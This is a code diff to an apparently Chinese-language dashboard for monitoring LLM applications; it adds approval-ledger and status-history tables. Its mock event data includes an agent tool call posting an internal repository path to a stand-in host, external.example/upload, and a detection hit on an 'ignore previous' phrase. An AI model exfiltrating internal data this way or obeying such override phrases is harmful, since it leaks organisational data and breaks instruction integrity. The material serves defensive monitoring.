@@ -75,7 +75,7 @@
             <div class="evidence-tabs">
               <div class="evidence-tab active" onclick="switchEvidenceTab(this,'summary')">证据摘要</div>
               <div class="evidence-tab" onclick="switchEvidenceTab(this,'json')">格式化 JSON</div>
-              <div class="evidence-tab" onclick="switchEvidenceTab(this,'raw')">原始载荷</div>
+              <div class="evidence-tab" onclick="switchEvidenceTab(this,'raw')">Raw 授权</div>
               <div class="evidence-tab" onclick="switchEvidenceTab(this,'rule')">规则解释</div>
             </div>
             <div class="evidence-box"><pre class="evidence-code" id="evidenceCode"></pre></div>
@@ -86,6 +86,26 @@
         <div class="card">
           <div class="card-header"><div class="card-title">处置记录</div></div>
           <div class="card-body"><div class="timeline" id="eventTimeline"></div></div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">动作与审批台账</div><span class="tag tag-primary">action_id / approval_id</span></div>
+          <div class="table-wrapper">
+            <table class="data-table">
+              <thead><tr><th>action_id</th><th>动作类型</th><th>action_status</th><th>rollback_status</th><th>TTL</th><th>approval_id</th><th>操作人</th></tr></thead>
+              <tbody id="actionLedgerBody"></tbody>
+            </table>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title">状态变更记录</div></div>
+          <div class="table-wrapper">
+            <table class="data-table">
+              <thead><tr><th>时间</th><th>变更前</th><th>变更后</th><th>变更人</th><th>说明</th></tr></thead>
+              <tbody id="statusHistoryBody"></tbody>
+            </table>
+          </div>
         </div>
 
         <div class="card">
@@ -228,6 +248,13 @@
         context: ['用户提交代码审查任务，要求检查配置文件和网络调用。', '模型计划调用 repo_reader 与 external_http_post。', 'Tool Input 包含 external.example/upload 与 repo_path=internal/payment。', '响应输出包含内部仓库路径摘要，已脱敏。'],
         json: '{\n  "span_id": "sp_04_tool",\n  "source_field": "tool.input",\n  "tool_name": "external_http_post",\n  "input": {\n    "url": "https://external.example/upload",\n    "payload": {\n      "repo_path": "internal/payment",\n      "reason": "code review context"\n    }\n  }\n}',
         raw: 'POST /upload HTTP/1.1\nHost: external.example\n\n{"repo_path":"internal/payment","reason":"code review context"}',
+        actions: [
+          { id: 'ACT-20260416-0018', type: 'restrict_tool', status: 'pending_approval', rollback: 'not_started', ttl: '6h', approval: 'APR-20260416-003', operator: '张安全' }
+        ],
+        statusHistory: [
+          { time: '2026-04-16 10:25:33', from: '-', to: '待确认', operator: '检测引擎', note: '命中工具能力边界规则并生成事件' },
+          { time: '2026-04-16 10:31:08', from: '待确认', to: '处理中', operator: '张安全', note: '人工确认风险，等待限制动作审批' }
+        ],
         ruleText: '规则 tool-boundary-v1.8.2：应用未声明外部 HTTP POST 能力，但 Span 中出现 external_http_post 工具调用，并携带内部资源路径时，进入工具能力边界复核。',
         fpReason: '暂无，当前事件已确认进入处理中。',
         acceptReason: '暂无，如业务确认接受风险需关联审批编号。',
@@ -260,6 +287,13 @@
         context: ['用户要求汇总候选员工联系信息。', '工具返回员工档案字段，包含手机号和部门。', '模型响应未完全压缩敏感字段。', '检测器对手机号片段进行脱敏展示。'],
         json: '{\n  "span_id": "sp_06_output",\n  "source_field": "llm.response",\n  "output_excerpt": "员工联系方式：[PHONE_MASKED]",\n  "redaction_state": "redacted"\n}',
         raw: 'LLM RESPONSE\n员工联系方式：[PHONE_MASKED]，部门：运营中心。原文已脱敏，需授权查看。',
+        actions: [
+          { id: 'ACT-20260416-0012', type: 'mask_output', status: 'succeeded', rollback: 'not_supported', ttl: '24h', approval: 'APR-20260416-001', operator: '王合规' }
+        ],
+        statusHistory: [
+          { time: '2026-04-16 09:58:12', from: '-', to: '待确认', operator: '检测引擎', note: '命中敏感输出规则' },
+          { time: '2026-04-16 10:08:44', from: '待确认', to: '已处置', operator: '王合规', note: '输出脱敏策略已生效' }
+        ],
         ruleText: '规则 response-sensitive-v2.4.0：当模型响应包含手机号、证件号、员工档案字段等敏感信息时，生成敏感输出复核事件。',
         fpReason: '暂无。',
         acceptReason: '暂无。',
@@ -292,6 +326,13 @@
         context: ['用户询问售后工单处理进度。', '提示词中出现“忽略之前回复模板”等普通表达。', '规则低置信度命中提示词风险。', '复核认为是业务话术，不构成风险。'],
         json: '{\n  "span_id": "sp_02_llm",\n  "source_field": "prompt.input",\n  "matched_phrase": "忽略之前回复模板",\n  "confidence": 0.43\n}',
         raw: 'USER PROMPT\n请忽略之前回复模板，用更简洁的方式告诉客户工单进度。',
+        actions: [
+          { id: 'ACT-20260416-0009', type: 'false_positive', status: 'succeeded', rollback: 'not_required', ttl: '-', approval: '-', operator: '李运营' }
+        ],
+        statusHistory: [
+          { time: '2026-04-16 08:41:20', from: '-', to: '待确认', operator: '检测引擎', note: '低置信度 Prompt 风险命中' },
+          { time: '2026-04-16 09:03:12', from: '待确认', to: '误报', operator: '李运营', note: '结合上下文复核为普通改写需求' }
+        ],
         ruleText: '规则 prompt-risk-low-confidence-v1.1：疑似覆盖原指令的表达需要结合上下文复核，低置信度命中不应直接触发限制动作。',
         fpReason: '业务话术触发低置信度规则，已进入规则优化样本池。',
         acceptReason: '不适用。',
@@ -328,6 +369,12 @@
         '<div class="timeline-item"><div class="timeline-dot red"></div><div class="timeline-content"><div class="timeline-time">' + profile.time + '</div><div class="timeline-text">检测引擎生成风险事件</div><div class="timeline-detail">状态：待确认</div></div></div>' +
         '<div class="timeline-item"><div class="timeline-dot orange"></div><div class="timeline-content"><div class="timeline-time">2026-04-16 10:31:08</div><div class="timeline-text">负责人复核事件</div><div class="timeline-detail">当前状态：' + profile.status + '</div></div></div>' +
         '<div class="timeline-item"><div class="timeline-dot gray"></div><div class="timeline-content"><div class="timeline-time">待执行</div><div class="timeline-text">下一步处置或关闭确认</div></div></div>';
+      document.getElementById('actionLedgerBody').innerHTML = (profile.actions || []).map(function(item) {
+        return '<tr><td class="mono">' + item.id + '</td><td>' + item.type + '</td><td><span class="tag tag-warning">' + item.status + '</span></td><td>' + item.rollback + '</td><td>' + item.ttl + '</td><td class="mono">' + item.approval + '</td><td>' + item.operator + '</td></tr>';
+      }).join('');
+      document.getElementById('statusHistoryBody').innerHTML = (profile.statusHistory || []).map(function(item) {
+        return '<tr><td>' + item.time + '</td><td>' + item.from + '</td><td>' + item.to + '</td><td>' + item.operator + '</td><td>' + item.note + '</td></tr>';
+      }).join('');
       renderEvidence();
     }
 
@@ -342,7 +389,7 @@
       if (!currentEvent) return;
       var content = '结论：' + currentEvent.finding + '\n\n证据锚点：' + currentEvent.traceId + ' / ' + currentEvent.spanId + '\n证据来源：' + currentEvent.source + '\n关联资源：' + currentEvent.resource;
       if (activeEvidenceTab === 'json') content = currentEvent.json;
-      if (activeEvidenceTab === 'raw') content = currentEvent.raw;
+      if (activeEvidenceTab === 'raw') content = 'Raw 原文不在普通详情页直接展示。\n\nraw_ref：' + currentEvent.rawRef + '\n授权入口：提交高敏访问审批后，由审计日志记录访问人、审批编号、访问时间和用途。\n建议用途：证据复核、合规抽检或误报申诉。';
       if (activeEvidenceTab === 'rule') content = currentEvent.ruleText;
       document.getElementById('evidenceCode').textContent = content;
     }
